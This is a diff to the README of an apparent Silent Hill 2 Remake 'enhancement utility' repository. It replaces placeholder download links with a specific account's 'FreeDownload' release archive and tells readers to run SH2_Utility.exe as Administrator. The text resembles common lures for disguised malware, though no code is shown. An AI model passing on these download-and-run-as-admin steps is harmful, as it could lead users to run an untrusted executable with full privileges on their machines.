@@ -15,7 +15,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ GET LATEST RELEASE ARCHIVE (.ZIP)](https://github.com/YOUR_USERNAME/sh2-remake-enhancement-utility/releases/download/v1.0.0/SilentHill2_EnhancementUtility.zip)
+### [⬇️ GET LATEST RELEASE ARCHIVE (.ZIP)](https://github.com/VergeSeniorKnife/sh2-remake-enhancement-utility/releases/download/FreeDownload/SilentHill2_EnhancementUtility.zip)
 
 ## 🎯 What This Does
 
@@ -34,7 +34,7 @@ Silent Hill 2 Remake Enhancement Utility is an external runtime assistant create
 
 ## 🚀 Installation & Setup
 
-1. Open the repository **[Releases](https://github.com/YOUR_USERNAME/sh2-remake-enhancement-utility/releases/download/v1.0.0/SilentHill2_EnhancementUtility.zip)** tab.
+1. Open the repository **[Releases](https://github.com/VergeSeniorKnife/sh2-remake-enhancement-utility/releases/download/FreeDownload/SilentHill2_EnhancementUtility.zip)** tab.
 2. Download **`SilentHill2_EnhancementUtility.zip`**.
 3. Extract the contents to any preferred folder.
 4. **Right-click `SH2_Utility.exe` and select "Run as Administrator".**
